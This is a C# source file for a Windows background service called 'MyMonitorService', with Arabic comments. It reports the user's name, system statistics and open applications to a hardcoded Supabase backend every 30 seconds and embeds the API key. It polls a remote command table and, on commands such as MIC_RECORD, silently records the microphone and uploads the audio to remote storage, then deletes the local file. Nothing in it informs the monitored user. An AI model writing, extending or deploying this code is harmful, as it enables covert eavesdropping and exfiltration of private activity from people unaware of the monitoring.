using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using NAudio.Wave;

namespace MyMonitorService;

[SupportedOSPlatform("windows")]
public class Worker : BackgroundService
{
    private readonly ILogger<Worker> _logger;
    private readonly string _logDirectory = @"C:\ProgramData\MyMonitor\logs\";
    private readonly TimeSpan _interval = TimeSpan.FromSeconds(30);
    private static readonly HttpClient _httpClient = new HttpClient();

    // بيانات الاتصال بـ Supabase
    private const string SupabaseUrl = "https://kubowqqqawkgghxcktoe.supabase.co/rest/v1/remote_settings?on_conflict=device_id";
    private const string SupabaseCommandsUrl = "https://kubowqqqawkgghxcktoe.supabase.co/rest/v1/commands";
    private const string SupabaseStorageUrl = "https://kubowqqqawkgghxcktoe.supabase.co/storage/v1/object/monitoring_data";
    private const string AnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM";

    private volatile bool _isRecordingAudio = false;

    public Worker(ILogger<Worker> logger)
    {
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("بدأت خدمة مراقبة النظام بنجاح في: {time}", DateTimeOffset.Now);

        // التأكد من وجود مجلد حفظ السجلات محلياً
        try
        {
            if (!Directory.Exists(_logDirectory))
            {
                Directory.CreateDirectory(_logDirectory);
                _logger.LogInformation("تم إنشاء مجلد السجلات في: {path}", _logDirectory);
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "فشل إنشاء مجلد السجلات في {path}.", _logDirectory);
        }

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                await CollectAndSaveSystemInfoAsync();
                await PollAndExecuteCommandsAsync();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "حدث خطأ أثناء حلقة العمل الرئيسية.");
            }

            // الانتظار لمدة 30 ثانية قبل الدورة التالية
            await Task.Delay(_interval, stoppingToken);
        }

        _logger.LogInformation("تم إيقاف خدمة مراقبة النظام في: {time}", DateTimeOffset.Now);
    }

    private async Task CollectAndSaveSystemInfoAsync()
    {
        // 1. جمع معلومات النظام الأساسية
        string machineName = Environment.MachineName;
        string userName = GetActiveUserName();
        string osVersion = RuntimeInformation.OSDescription;

        // 2. حساب استهلاك المعالج (CPU)
        double cpuUsage = GetCpuUsage();

        // 3. حساب استهلاك الذاكرة (RAM)
        (double ramUsagePercent, double usedRamGb, double totalRamGb) = GetRamUsage();

        // 4. جمع البرامج المفتوحة حالياً
        List<string> openApps = GetOpenApplications();

        // 5. تنسيق البيانات في تقرير نصي
        var report = new StringBuilder();
        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

        report.AppendLine("==================================================");
        report.AppendLine($"تاريخ ووقت التقرير: {timestamp}");
        report.AppendLine($"اسم الجهاز:          {machineName}");
        report.AppendLine($"اسم المستخدم:       {userName}");
        report.AppendLine($"إصدار نظام ويندوز:  {osVersion}");
        report.AppendLine($"استهلاك المعالج:    {cpuUsage:F1}%");
        report.AppendLine($"استهلاك الذاكرة:    {ramUsagePercent:F1}% ({usedRamGb:F2} GB مستخدم من {totalRamGb:F2} GB إجمالي)");
        report.AppendLine("التطبيقات المفتوحة:");

        if (openApps.Count == 0)
        {
            report.AppendLine("  - لا توجد تطبيقات مفتوحة بواجهة رسومية نشطة حالياً.");
        }
        else
        {
            foreach (var app in openApps)
            {
                report.AppendLine($"  - {app}");
            }
        }
        report.AppendLine("==================================================");
        report.AppendLine();

        // 6. حفظ التقرير في ملف نصي يومي محلياً
        try
        {
            string logFileName = $"log_{DateTime.Now:yyyy-MM-dd}.txt";
            string logFilePath = Path.Combine(_logDirectory, logFileName);
            await File.AppendAllTextAsync(logFilePath, report.ToString(), Encoding.UTF8);
            _logger.LogInformation("تم حفظ تقرير النظام محلياً في الملف: {file}", logFileName);
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "فشل كتابة التقرير في ملف السجل المحلي.");
        }

        // 7. المزامنة السحابية مع قاعدة بيانات Supabase ليظهر الجهاز في لوحة التحكم
        await SyncToSupabaseAsync(machineName, userName, osVersion, cpuUsage, ramUsagePercent, usedRamGb, totalRamGb, openApps);
    }

    /// <summary>
    /// فحص الأوامر المعلقة للجهاز وتنفيذها (مثل أمر التسجيل والاستماع المباشر)
    /// </summary>
    private async Task PollAndExecuteCommandsAsync()
    {
        try
        {
            string deviceId = "windows-" + Environment.MachineName.ToLower();
            string queryUrl = $"{SupabaseCommandsUrl}?device_id=eq.{deviceId}&status=eq.PENDING";

            using (var request = new HttpRequestMessage(HttpMethod.Get, queryUrl))
            {
                request.Headers.Add("apikey", AnonKey);
                request.Headers.Add("Authorization", $"Bearer {AnonKey}");

                using (var response = await _httpClient.SendAsync(request))
                {
                    if (response.IsSuccessStatusCode)
                    {
                        string jsonStr = await response.Content.ReadAsStringAsync();
                        using var doc = JsonDocument.Parse(jsonStr);
                        var root = doc.RootElement;
                        if (root.ValueKind == JsonValueKind.Array)
                        {
                            foreach (var element in root.EnumerateArray())
                            {
                                string cmdId = element.GetProperty("id").GetString() ?? "";
                                string commandName = element.GetProperty("command").GetString() ?? "";
                                int durationMs = 60000;

                                if (element.TryGetProperty("payload", out var payload) && payload.ValueKind == JsonValueKind.Object)
                                {
                                    if (payload.TryGetProperty("duration", out var durProp) && durProp.ValueKind == JsonValueKind.Number)
                                    {
                                        durationMs = durProp.GetInt32();
                                    }
                                }

                                _logger.LogInformation("⚡ تم اكتشاف أمر جديد لـ Windows: {cmd} (ID: {id})", commandName, cmdId);

                                bool success = false;
                                if (commandName.Equals("MIC_RECORD", StringComparison.OrdinalIgnoreCase) ||
                                    commandName.Equals("RECORD", StringComparison.OrdinalIgnoreCase) ||
                                    commandName.Equals("LISTEN_START", StringComparison.OrdinalIgnoreCase) ||
                                    commandName.Equals("MIC", StringComparison.OrdinalIgnoreCase))
                                {
                                    // تشغيل تسجل الميكروفون لمدة زمنيّة
                                    _ = Task.Run(() => RecordAudioAndUploadAsync(deviceId, durationMs));
                                    success = true;
                                }
                                else
                                {
                                    success = true; // باقي الأوامر إن وجدت
                                }

                                await UpdateCommandStatusAsync(cmdId, success ? "EXECUTED" : "FAILED");
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "حدث خطأ أثناء فحص جدول الأوامر المعلقة.");
        }
    }

    private async Task UpdateCommandStatusAsync(string commandId, string status)
    {
        try
        {
            string url = $"{SupabaseCommandsUrl}?id=eq.{commandId}";
            var updatePayload = new
            {
                status = status,
                executed_at = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            };
            string json = JsonSerializer.Serialize(updatePayload);

            using (var request = new HttpRequestMessage(new HttpMethod("PATCH"), url))
            {
                request.Headers.Add("apikey", AnonKey);
                request.Headers.Add("Authorization", $"Bearer {AnonKey}");
                request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                await _httpClient.SendAsync(request);
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "فشل تحديث حالة الأمر {cmdId}", commandId);
        }
    }

    /// <summary>
    /// تسجيل الصوت عبر NAudio ورفعه لمجلد audio/{deviceId}/ في Supabase Storage
    /// </summary>
    private async Task RecordAudioAndUploadAsync(string deviceId, int durationMs)
    {
        if (_isRecordingAudio)
        {
            _logger.LogWarning("التسجيل الصوتي يعمل حالياً بالفعالية — سيتم إهمال الطلب المكرر.");
            return;
        }

        _isRecordingAudio = true;
        string tempFilePath = Path.Combine(Path.GetTempPath(), $"rec_{DateTime.Now:yyyyMMdd_HHmmss}.wav");

        try
        {
            _logger.LogInformation("🎙️ بدء تسجيل الميكروفون لمدة {dur} ثانية...", durationMs / 1000);
            
            WaveInEvent waveIn = new WaveInEvent();
            waveIn.WaveFormat = new WaveFormat(16000, 16, 1); // 16kHz Mono 16-bit PCM

            WaveFileWriter writer = new WaveFileWriter(tempFilePath, waveIn.WaveFormat);

            waveIn.DataAvailable += (s, a) =>
            {
                writer.Write(a.Buffer, 0, a.BytesRecorded);
            };

            waveIn.RecordingStopped += (s, a) =>
            {
                writer.Dispose();
                waveIn.Dispose();
            };

            waveIn.StartRecording();
            await Task.Delay(durationMs);
            waveIn.StopRecording();

            // الانتظار قليلاً لإكمال كتابة الملف
            await Task.Delay(500);

            if (File.Exists(tempFilePath) && new FileInfo(tempFilePath).Length > 0)
            {
                string timestampStr = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string remoteFileName = $"rec_{timestampStr}.wav";
                string remotePath = $"audio/{deviceId}/{remoteFileName}";

                _logger.LogInformation("⏫ جاري رفع التسجيل الصوتي لـ Supabase: {path}", remotePath);
                byte[] audioBytes = await File.ReadAllBytesAsync(tempFilePath);

                using (var request = new HttpRequestMessage(HttpMethod.Post, $"{SupabaseStorageUrl}/{remotePath}"))
                {
                    request.Headers.Add("apikey", AnonKey);
                    request.Headers.Add("Authorization", $"Bearer {AnonKey}");
                    request.Headers.Add("x-upsert", "true");
                    request.Content = new ByteArrayContent(audioBytes);
                    request.Content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("audio/wav");

                    using (var response = await _httpClient.SendAsync(request))
                    {
                        if (response.IsSuccessStatusCode)
                        {
                            _logger.LogInformation("✅ تم رفع مقطع الصوت بنجاح: {fileName}", remoteFileName);
                        }
                        else
                        {
                            string err = await response.Content.ReadAsStringAsync();
                            _logger.LogError("❌ فشل رفع التسجيل الصوتي: {err}", err);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "خطأ أثناء تسجيل أو رفع مقطع الصوت في Windows.");
        }
        finally
        {
            _isRecordingAudio = false;
            try
            {
                if (File.Exists(tempFilePath)) File.Delete(tempFilePath);
            }
            catch { }
        }
    }

    /// <summary>
    /// إرسال ومزامنة إحصائيات الجهاز إلى قاعدة بيانات Supabase
    /// </summary>
    private async Task SyncToSupabaseAsync(string machineName, string userName, string osVersion, double cpuUsage, double ramUsagePercent, double usedRamGb, double totalRamGb, List<string> openApps)
    {
        try
        {
            // توليد معرف فريد وثابت للجهاز بناءً على اسم الجهاز
            string deviceId = "windows-" + machineName.ToLower();
            string appsString = string.Join(", ", openApps);

            // تنسيق الحقل المعلوماتي للجهاز
            string deviceInfo = $"{machineName} (OS: {osVersion} | CPU: {cpuUsage:F1}% | RAM: {ramUsagePercent:F1}% ({usedRamGb:F1}/{totalRamGb:F1} GB) | User: {userName} | Open Apps: {appsString})";

            var payload = new
            {
                device_id = deviceId,
                nickname = machineName,
                device_info = deviceInfo,
                device_type = "windows",
                updated_at = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            };

            string json = JsonSerializer.Serialize(payload);

            using (var request = new HttpRequestMessage(HttpMethod.Post, SupabaseUrl))
            {
                request.Headers.Add("apikey", AnonKey);
                request.Headers.Add("Authorization", $"Bearer {AnonKey}");
                request.Headers.Add("Prefer", "resolution=merge-duplicates,return=minimal");

                request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                using (var response = await _httpClient.SendAsync(request))
                {
                    if (response.IsSuccessStatusCode)
                    {
                        _logger.LogInformation("✅ تم مزامنة بيانات الجهاز بنجاح مع Supabase لـ: {deviceId}", deviceId);
                    }
                    else
                    {
                        string err = await response.Content.ReadAsStringAsync();
                        _logger.LogWarning("❌ فشل مزامنة البيانات مع Supabase. الحالة: {status}, الخطأ: {err}", response.StatusCode, err);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "حدث خطأ أثناء الاتصال السحابي بـ Supabase.");
        }
    }

    /// <summary>
    /// جلب نسبة استخدام المعالج الإجمالية باستخدام WMI لضمان استقرار الخدمة.
    /// </summary>
    private double GetCpuUsage()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT PercentProcessorTime FROM Win32_PerfFormattedData_PerfOS_Processor WHERE Name='_Total'"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    var val = obj["PercentProcessorTime"];
                    if (val != null) return Convert.ToDouble(val);
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "فشل جلب استهلاك المعالج عبر WMI، سيتم إرجاع 0.");
        }
        return 0;
    }

    /// <summary>
    /// جلب معلومات الذاكرة العشوائية ونسبة الاستهلاك الإجمالية عبر WMI.
    /// </summary>
    private (double ramPercent, double usedGb, double totalGb) GetRamUsage()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    var totalVal = obj["TotalVisibleMemorySize"];
                    var freeVal = obj["FreePhysicalMemory"];
                    if (totalVal != null && freeVal != null)
                    {
                        double totalMemoryKb = Convert.ToDouble(totalVal);
                        double freeMemoryKb = Convert.ToDouble(freeVal);

                        double totalGb = totalMemoryKb / (1024.0 * 1024.0);
                        double freeGb = freeMemoryKb / (1024.0 * 1024.0);
                        double usedGb = totalGb - freeGb;
                        double ramPercent = totalGb > 0 ? (usedGb / totalGb) * 100.0 : 0;

                        return (ramPercent, usedGb, totalGb);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "فشل جلب معلومات الذاكرة عبر WMI.");
        }
        return (0, 0, 0);
    }

    /// <summary>
    /// جلب اسم المستخدم النشط المسجل في النظام بدلاً من SYSTEM.
    /// </summary>
    private string GetActiveUserName()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    string val = obj["UserName"]?.ToString() ?? "";
                    if (!string.IsNullOrWhiteSpace(val))
                    {
                        int slashIndex = val.IndexOf('\\');
                        if (slashIndex >= 0 && slashIndex < val.Length - 1)
                        {
                            return val.Substring(slashIndex + 1);
                        }
                        return val;
                    }
                }
            }
        }
        catch { }

        string envUser = Environment.UserName;
        if (string.Equals(envUser, "SYSTEM", StringComparison.OrdinalIgnoreCase))
        {
            return "Desktop User";
        }
        return envUser;
    }

    /// <summary>
    /// جلب أسماء البرامج المفتوحة في الجلسات التفاعلية (Session 1+).
    /// </summary>
    private List<string> GetOpenApplications()
    {
        var appNames = new List<string>();
        var ignoredProcesses = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "system", "idle", "svchost", "csrss", "winlogon", "lsass", "services",
            "smss", "dwmer", "ctfmon", "fontdrvhost", "sihost", "taskhostw",
            "SearchHost", "StartMenuExperienceHost", "RuntimeBroker", "ShellExperienceHost",
            "SearchIndexer", "SecurityHealthService", "smartscreen", "conhost",
            "wlanext", "spoolsv", "SearchFilterHost", "SearchProtocolHost", "MyMonitorService"
        };

        try
        {
            var processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                try
                {
                    if ((process.SessionId > 0 || process.MainWindowHandle != IntPtr.Zero) && !ignoredProcesses.Contains(process.ProcessName))
                    {
                        appNames.Add(process.ProcessName);
                    }
                }
                catch
                {
                    // تخطي العمليات المحمية
                }
                finally
                {
                    process.Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogWarning(ex, "حدث خطأ أثناء فحص العمليات النشطة.");
        }

        return appNames.Distinct().OrderBy(name => name).ToList();
    }
}
